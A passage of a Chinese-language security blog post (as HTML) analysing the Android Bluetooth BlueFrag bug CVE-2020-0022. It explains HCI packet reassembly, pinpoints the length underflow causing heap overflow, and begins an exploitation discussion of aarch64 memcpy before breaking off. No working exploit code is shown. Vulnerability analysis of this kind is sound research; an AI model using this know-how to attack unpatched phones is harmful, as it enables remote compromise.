@@ -1,0 +1,1299 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+<meta name="google-site-verification" content="0zti2a3T69n1U7TLwUhRVYhNLB-zZXfCbFPUZIl_2B0" />
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="fenix's, blog" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="ctitle: Android 8.0-9.0 Bluetooth Zero-Click RCE – BlueFrag 漏洞分析及利用（CVE-2020-0022）categories: 二进制date: 2020-04-28 11:21:30tags:  CVE-2020-0022 Bluetooth Androidpassword: fk-RkGB8sEwQDmu.abstract: ‘‘">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fenix&#39;s blog">
+<meta property="og:url" content="https://0x43434343.com/2020/05/06/202004281121/index.html">
+<meta property="og:site_name" content="fenix&#39;s blog">
+<meta property="og:description" content="ctitle: Android 8.0-9.0 Bluetooth Zero-Click RCE – BlueFrag 漏洞分析及利用（CVE-2020-0022）categories: 二进制date: 2020-04-28 11:21:30tags:  CVE-2020-0022 Bluetooth Androidpassword: fk-RkGB8sEwQDmu.abstract: ‘‘">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/4f517f0d8d114ee7e53cd26eea7b513525569813">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/4f517f0d8d114ee7e53cd26eea7b513525569813">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/0ec2a09b90aae0943bf82eeb6c8f105d6c35afc9">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/17153833de232241ae0810efe9e7b283759b1475">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/3409b64c5e313749c2da357761b86011e147c1e9">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/af2df3251b8d6fc631d45e6d74dcbb7393768c07">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/337aa78654a555d4781b8d29f37895e996c86984">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/207cd7705fd11f9f6f51c377ca146f9eee46aad3">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/df69691e9dd1773af7d7d5aa818688904f254fa8">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/250cab910acd370c7d1db6a7a7c909ac88e4ec91">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/cb2281aec1d3e2e02d680720e8223744dd5f6d8b">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/dbff537ed7aa8a353efd880de8577373ba5f5616">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/b546fa4bf8166b4dd21fde867828d2d57e51ed42">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/e41a5fe61cff3b40104edea3dd60bdb5e6020cc3">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/116368779bcd62afb1a238b481de2ca6ad35116e">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/75b887a23729d1faf13d49d74aeadf2ec51ceba1">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/4028a27059348deb34ce13041ce46af81a0771a5">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/703da9b72ba42612b8015cb0600d4e57df0f6412">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/e24b5d78a1216c8c76dd880d8ddf269f3530504b">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/4b7fed4c0b94715f153016978840187a421f3cee">
+<meta property="og:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/4f517f0d8d114ee7e53cd26eea7b513525569813">
+<meta property="og:updated_time" content="2020-05-18T07:19:28.793Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="fenix&#39;s blog">
+<meta name="twitter:description" content="ctitle: Android 8.0-9.0 Bluetooth Zero-Click RCE – BlueFrag 漏洞分析及利用（CVE-2020-0022）categories: 二进制date: 2020-04-28 11:21:30tags:  CVE-2020-0022 Bluetooth Androidpassword: fk-RkGB8sEwQDmu.abstract: ‘‘">
+<meta name="twitter:image" content="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/4f517f0d8d114ee7e53cd26eea7b513525569813">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://0x43434343.com/2020/05/06/202004281121/"/>
+
+
+
+
+
+  <title> | fenix's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">fenix's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            Sitemap
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://0x43434343.com/2020/05/06/202004281121/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="fenix">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fenix's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline"></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-05-06T15:09:19+08:00">
+                2020-05-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  4,269
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  20
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="c"><a href="#c" class="headerlink" title="c"></a>c</h2><p>title: Android 8.0-9.0 Bluetooth Zero-Click RCE – BlueFrag 漏洞分析及利用（CVE-2020-0022）<br>categories: 二进制<br>date: 2020-04-28 11:21:30<br>tags:</p>
+<ul>
+<li>CVE-2020-0022</li>
+<li>Bluetooth</li>
+<li>Android<br>password: fk-RkGB8sEwQDmu.<br>abstract: ‘<img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/4f517f0d8d114ee7e53cd26eea7b513525569813">‘</li>
+</ul>
+<hr>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/4f517f0d8d114ee7e53cd26eea7b513525569813" alt=""></p>
+<a id="more"></a>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Google 官方在 2020 年 2 月的 Android 安全公告中修复了一个蓝牙协议栈的严重漏洞，编号 CVE-2020-0022。在 Android 8.0、8.1、9 中可以 Zero-Click RCE，Android 10 能造成 DOS 的效果。</p>
+<p>2020 年 4 月 22 日，网上公开了《CVE-2020-0022 an Android 8.0-9.0 Bluetooth Zero-Click RCE – BlueFrag》，详细介绍了该漏洞的发现过程、成因及利用。</p>
+<p>本文在学习的基础上，对该漏洞的原理及利用过程做个记录总结。</p>
+<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>使用 Google Nexus 6P 作为实验设备，刷入了最新的官方 ROM：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">version: 8.1.0 (OPM7.181205.001, Dec 2018)</span><br><span class="line">link: https://dl.google.com/dl/android/aosp/angler-opm7.181205.001-factory-b75ce068.zip</span><br><span class="line">SHA-256 Checksum: b75ce068f23a0e793805f80fccbc081eca52861ef5eb080c47f502de4c3f9713</span><br><span class="line">```	</span><br><span class="line"></span><br><span class="line">此外，刷入了 TWRP、Magisk、Termux 便于调试。</span><br><span class="line"></span><br><span class="line">如果使用的非 linux 系统，推荐使用树莓派作为发包工具。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 蓝牙协议栈</span><br><span class="line"></span><br><span class="line">蓝牙核心系统架构如下，想深入学习可参考蓝牙 Ver 4.1 核心规范白皮书。</span><br><span class="line"></span><br><span class="line">![](https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/f92f4017fe8bcabb9c360944465cc2451d5a1caa)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">可抽象为三层：</span><br><span class="line"></span><br><span class="line"> - Controller 层，在蓝牙芯片中实现，提供射频、基带、链路管理等底层功能。取决于蓝牙芯片的具体实现，Controller 又可细分为四种： BR/EDR Controller、BR/EDR/LE Controller（双模蓝牙）、LE Controller、AMP Controller。</span><br><span class="line"></span><br><span class="line"> - HCI（Host Controller Interface） 层，它向 Host 提供了一个访问 Controller（底层硬件）的统一接口。</span><br><span class="line"></span><br><span class="line"> - Host 层，建立在 HCI 之上，包括 L2CAP、SDP 等高层协议。在 Host 层处于最底层的是 L2CAP（Logical Link Control and Adaptation Protocol）协议。L2CAP 能向上层提供面向连接的或者无连接的数据服务，同时提供了协议/通道的多路复用、分段和重组、信道流控、错误控制及重传机制等功能。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">&lt;b&gt;以下部分内容摘自文章：《蓝牙协议中 HCI 层的研究与开发》（刘向阳，沈连丰，东南大学移动通信国家重点实验室， 南京 210096）&lt;/b&gt;</span><br><span class="line"> </span><br><span class="line">该漏洞位于蓝牙协议栈的 HCI 层。HCI 是通过包的方式来传送数据、命令和事件的，所有在主机和主机控制器之间的通信都以包的形式进行。包括每个命令的返回参数都通过特定的事件包来传输。HCI 有数据、命令和事件三种包，其中数据包是双向的，命令包只能从主机发往主机控制器，而事件包始终是主机控制器发向主机的。主机发出的大多数命令包都会触发主机控制器产生相应的事件包作为响应。数据包则可分为 ACL 和 SCO 的数据包。</span><br><span class="line"></span><br><span class="line">ACL 数据包格式如下：</span><br><span class="line"></span><br><span class="line">![](https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/4356badbd16c92d3df1c0ccd1bfa5f0f759f2fad)</span><br><span class="line"></span><br><span class="line">ACL 数据包中的 Handle 即连接句柄是一个 12 比特的标志符，用于唯一确认两台蓝牙设备间的数据或语音连接，可以看作是两台蓝牙设备间唯一的数据通道的标识。两台设备间只能有一条 ACL 连接，也就是只有一个 ACL 的连接句柄，相应 L2CAP 的信道都是建立在这个连接句柄表示的数据通道上。</span><br><span class="line"></span><br><span class="line">在 ACL 数据包中，Flags 分为 PB Flag 和 BC Flag，PB Flag 为包的界限标志，PB Flag=0x00 表示此数据包为上层协议包（如 L2CAP 包）的起始部分；PB Flag=0x01 表示此数据包为上层协议包（如 L2CAP 包）的后续部分。BC Flag 为广播发送的标志，BC Flag=0x00 表示无广播发送，只是点对点的发送；BC Flag=0x01 表示对所有处于激活状态的从设备进行广播发送，BC Flag=0x02 表示对所有的从设备包括处于休眠状态的从设备进行广播发送。ACL 数据包中的 Data Total Length 表示所载荷的数据的长度，以字节为单位。</span><br><span class="line"></span><br><span class="line">白皮书中关于 PB Flag 字段的描述如下：</span><br><span class="line"></span><br><span class="line">![](https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/5c37be6c5562818c704e6ebc4375aec1e298f72f)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; </span><br><span class="line"></span><br><span class="line">&gt;</span><br><span class="line">&gt; </span><br><span class="line"></span><br><span class="line">HCI 作为中间层，实现了分段与重组功能，以适应 Host 和 Controller 层的 PDU 。在接收来自上层（如 L2CAP）的时候对包进行分段，收到下层发送给上层（如 L2CAP）数据包的时候对包进行重组。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![](https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/19823e9d58fec7da642f7da99a507509e2ef9df8)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">L2CAP 实现了基于通道（Channel）的概念，在原有的数据链路上抽象出多条逻辑通道，从而实现多路复用，面向连接的数据包格式如下：</span><br><span class="line"></span><br><span class="line">![](https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/ef195318fc45f277aba1a4ff41480d40bc4c0d7a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">可以在手机的开发者选项中启用 Enable Bluetooth HCI snoop log 功能，方便更直观的了解蓝牙的通信过程。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![](https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/5346536d5bbf494c6b7b044828128397c58007be)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 源码分析</span><br><span class="line"></span><br><span class="line"> 该漏洞在 `android-8.0.0_r43`、`android-8.1.0_r73`、`android-9.0.0_r53`、`android-10.0.0_r29` 等版本进行了修复，下面根据源码分析数据包的解析流程。</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> ``` bash</span><br><span class="line"> git clone https://android.googlesource.com/platform/system/bt</span><br><span class="line"> </span><br><span class="line"> git checkout android-8.1.0_r72</span><br></pre></td></tr></table></figure>
+<p>在 <code>bt/hci/src/hci_layer_linux.cc</code> 中 HCI 收到数据包时， 为之申请内存并加上 <code>BT_HDR</code> 头部，根据 type 判断如果是 ACL 数据包 ，直接交由 <code>bt/hci/src/hci_layer.cc</code> 的 <code>acl_event_received()</code> 函数处理（此时的数据包已经剥离了 1 bytes 的 HCI Packet Type）。</p>
+<p> <img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/0ec2a09b90aae0943bf82eeb6c8f105d6c35afc9" alt=""></p>
+<p> <img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/17153833de232241ae0810efe9e7b283759b1475" alt=""></p>
+<p> 调用 <code>bt/hci/src/packet_fragmenter.cc</code> 的 <code>reassemble_and_dispatch()</code> 函数。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/3409b64c5e313749c2da357761b86011e147c1e9" alt=""></p>
+<p>行 127 到 134，从数据包中依次取出 <code>handle</code>、<code>acl length</code>、<code>l2cap length</code>，从 handle 提取出 2 bits  的 PB Flag 和 12 bits 的 Connection Handle（连接句柄）。<code>partial_packets</code> 是一个 map 结构，用于存储不同连接的数据包指针。行 136 到 147，如果是controller 到 host 的首包（PB flag 为 2），判断之前是否已经接收过该连接的包，如果有则丢弃老的包。行 149 到 154，ACL 数据包载荷最小应为 4 个字节，包括 L2CAP length 及 CID 各 2 字节。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/af2df3251b8d6fc631d45e6d74dcbb7393768c07" alt=""> </p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/337aa78654a555d4781b8d29f37895e996c86984" alt=""></p>
+<p>行 156 到 168，计算原完整 L2CAP 数据包的长度，判断该长度是否溢出，并且 L2CAP 的载荷要小于 4096 字节，这表明 HCI 层只能重组 L2CAP length &lt;= 4096 的 L2CAP 包，否则需要依靠 L2CAP 自身的分段机制。行 170 到 178，判断是否还有后续的数据包分段，如果没有则直接返回。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/207cd7705fd11f9f6f51c377ca146f9eee46aad3" alt=""></p>
+<p>如果还有后续的包，就需要进行包重组。行 180 到 186，分配 <code>partial_packet</code> 结构用于重组数据包，分别设置 <code>partial_packet-&gt;event</code>、<code>partial_packet-&gt;len</code>、<code>partial_packet-&gt;offset</code> 的值。 <code>partial_packet-&gt;len</code> 为原完整 L2CAP 包的长度，<code>partial_packet-&gt;offset</code> 指向当前的分段偏移，重组后的包位于 <code>partial_packet-&gt; data</code>。紧接着调用 memcpy 将首包拷贝到 <code>partial_packet-&gt; data</code> 中。</p>
+<p>行 189 到 196，跳过 handle 并调整 Data Total Length 的值，将 <code>partial_packet</code> 地址放入 <code>partial_packets</code> 中，释放当前分段包。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/df69691e9dd1773af7d7d5aa818688904f254fa8" alt=""></p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/250cab910acd370c7d1db6a7a7c909ac88e4ec91" alt=""></p>
+<p>上面是对于首包的处理逻辑，下面看看续包。行 198 到 205，如果在 <code>partial_packets</code> 中找不到该连接的前序包，释放该无效包并直接返回，要是找到了，就需要将续包和前序包进行重组。</p>
+<p>行 206 到 219，从 <code>partial_packets</code> 中找到前序包 <code>partial_packet</code>。<code>packet-&gt;len - HCI_ACL_PREAMBLE_SIZE</code> 为 ACL 续包载荷的长度（L2CAP 数据包分片），<code>partial_packet-&gt;offset</code> 为已经接收的前序包的偏移，将二者之和 <code>projected_offset</code> 与预期 L2CAP 总长度 <code>partial_packet-&gt;len</code> 比较，如果大于预期长度，需要对当前续包进行裁剪，调整 <code>packet-&gt;len</code>，避免拷贝后 <code>partial_packet</code> 越界。</p>
+<p>这里将 <code>partial_packet</code> 的剩余可用长度直接作为 <code>packet-&gt;len</code>，少算了 <code>HCI_ACL_PREAMBLE_SIZE</code>。在行 221 调用 memcpy 的时候， 拷贝长度是 <code>packet-&gt;len - packet-&gt;offset</code>。</p>
+<p>因此，如果进入了上面的 if 逻辑，重组后的包会漏掉最后的 4 字节。特殊的，如果调整后的 <code>packet-&gt;len &lt; HCI_ACL_PREAMBLE_SIZE（4 字节）</code>，会整数下溢导致拷贝长度变成一个很大的数，触发堆溢出。</p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/cb2281aec1d3e2e02d680720e8223744dd5f6d8b" alt=""></p>
+<p><img src="https://0x43434343-1259151589.cos.ap-beijing.myqcloud.com/bluefrag/dbff537ed7aa8a353efd880de8577373ba5f5616" alt=""></p>
+<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>理解了上述漏洞原理，很容易构造出 PoC，将一个 L2CAP 包拆分成多个 ACL 数据包发送并满足漏洞触发条件即可。</p>
+<p>在实际测试中， 该漏洞在 android 8.0、8.1、9 等版本不会直接 crash。这得益于 aarch64 架构 memcpy 的实现，为了提高效率，不是简单的单字节拷贝。如下所示，memcpy 根据拷贝长度的不同有三种处理逻辑：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">/* Copies are split into 3 main cases: small copies of up to 16 bytes,</span><br><span class="line">   medium copies of 17..96 bytes which are fully unrolled. Large copies</span><br><span class="line">   of more than 96 bytes align the destination and use an unrolled loop</span><br><span class="line">   processing 64 bytes per iteration.</span><br><span class="line">   Small and medium copies read all data before writing, allowing any</span><br><span class="line">   kind of overlap, and memmove tailcalls memcpy for these cases as</span><br><span class="line">   well as non-overlapping copies.</span><br><span class="line">*/</span><br><span class="line">	prfm    PLDL1KEEP, [src]</span><br><span class="line">	add	srcend, src, count</span><br><span class="line">	add	dstend, dstin, count &lt;-- srcend、dstend 各指向 src、end 的末尾。</span><br><span class="line">        cmp     count, 16</span><br><span class="line">        b.ls    L(copy16)</span><br><span class="line">	cmp	count, 96</span><br><span class="line">	b.hi	L(copy_long)</span><br><span class="line">	...</span><br><span class="line">	...</span><br><span class="line">		/* Align DST to 16 byte alignment so that we don&apos;t cross cache line</span><br><span class="line">	   boundaries on both loads and stores.	 There are at least 96 bytes</span><br><span class="line">	   to copy, so copy 16 bytes unaligned and then align.	The loop</span><br><span class="line">	   copies 64 bytes per iteration and prefetches one iteration ahead.  */</span><br><span class="line">	.p2align 4</span><br><span class="line">L(copy_long):</span><br><span class="line">	and	tmp1, dstin, 15</span><br><span class="line">	bic	dst, dstin, 15  &lt;-- 将 dst 对齐到 16 字节。</span><br><span class="line">	ldp	D_l, D_h, [src]</span><br><span class="line">	sub	src, src, tmp1</span><br><span class="line">	add	count, count, tmp1	/* Count is now 16 too large.  */</span><br><span class="line">	ldp	A_l, A_h, [src, 16]</span><br><span class="line">	stp	D_l, D_h, [dstin]</span><br><span class="line">	ldp	B_l, B_h, [src, 32]</span><br><span class="line">	ldp	C_l, C_h, [src, 48]</span><br><span class="line">	ldp	D_l, D_h, [src, 64]!</span><br><span class="line">	subs	count, count, 128 + 16	/* Test and readjust count.  */</span><br><span class="line">	b.ls	2f </span><br><span class="line">1:  &lt;-- 循环拷贝，每次拷贝 64 字节。</span><br><span class="line">	stp	A_l, A_h, [dst, 16]</span><br><span class="line">	ldp	A_l, A_h, [src, 16]</span><br><span class="line">	stp	B_l, B_h, [dst, 32]</span><br><span class="line">	ldp	B_l, B_h, [src, 32]</span><br><span class="line">	stp	C_l, 